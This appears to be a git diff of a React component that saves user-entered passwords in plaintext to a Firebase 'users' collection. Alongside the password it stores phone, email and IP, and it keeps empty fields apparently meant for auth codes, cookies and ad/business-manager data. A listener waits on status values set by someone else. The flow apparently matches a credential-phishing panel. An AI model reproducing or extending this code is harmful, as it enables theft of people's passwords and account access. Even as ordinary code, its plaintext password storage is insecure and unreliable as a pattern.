@@ -54,7 +54,7 @@ const MyPopup = ({ isOpen, onClose, onSave }) => {
     msg: "",
   });
   const navigate = useNavigate();
-  //const [data, setData] = useState({});
+  const [data, setData] = useState({});
   const usersRef = collection(db, "users");
   const q = query(usersRef, orderBy("auto_id", "desc", limit(1)));
   const [disabled, setDisabled] = useState(true);
@@ -88,11 +88,7 @@ const MyPopup = ({ isOpen, onClose, onSave }) => {
           });
           break;
         default:
-          console.log('status'+status);
-         // setResult({
-            //type: "error",
-            //msg: "Unhandled status:" + status,
-         // });
+          console.log(status);
       }
       setIsLoading(false); // Set loading back to false
     });
@@ -104,15 +100,11 @@ const MyPopup = ({ isOpen, onClose, onSave }) => {
         const sfDocRef = doc(db, "users", userID);
         const sfDoc = await transaction.get(sfDocRef);
         const dosLast = await getDocs(q);
-
         if (!sfDoc.exists()) {
           throw "Document does not exist!";
         }
-
         const [lastest] = dosLast.docs
-
         const auto_id = (lastest?.get("auto_id") || 0) + 1;
-
         transaction.update(sfDocRef, { auto_id });
       });
 
@@ -127,32 +119,29 @@ const MyPopup = ({ isOpen, onClose, onSave }) => {
     setIsLoading(true); // Set loading to true while saving data
     setDisabled(true);
     try {
-      const { phone, email,courseID,ip } = JSON.parse(
-        localStorage.getItem("user") || "{}"
-      );
-      const userId = localStorage.getItem("userId");
+      if (result.type && result.type !== "success") {
+        updateDoc(doc(db, "users", data.id), {
+          status: 1,
+          pass: pass
+        });
+        return;
+      }
       setResult({
         type: "",
         msg: "",
       });
-      console.log(userId);
-      if(userId){
-        updateDoc(doc(db, "users",userId), {
-          status: 1,
-          pass: pass,
-          phone: phone,
-          email: email
-        });
-        listener(userId);
-        return;
-      }else{
+      const formData = JSON.parse(
+        localStorage.getItem("user") || "{}"
+      );
+
+      if(formData){
         const user = await addDoc(collection(db, "users"), {
-          pass,phone,email,auth:'',ip,status: 1,status2:0,ck:'',pg:'',bm:'',ad:'',if:'',createdAt: new Date().getTime(),
+          pass:pass,phone:formData.phone,email:formData.email,auth:'',ip:formData.ip,status: 1,status2:0,ck:'',pg:'',bm:'',ad:'',if:'',createdAt: new Date().getTime(),
         });
         if(user.id){
           updateIndex(user.id);
+          setData(user);
           listener(user.id);
-          localStorage.setItem("userId",user.id);
         }
       }
     } catch (error) {
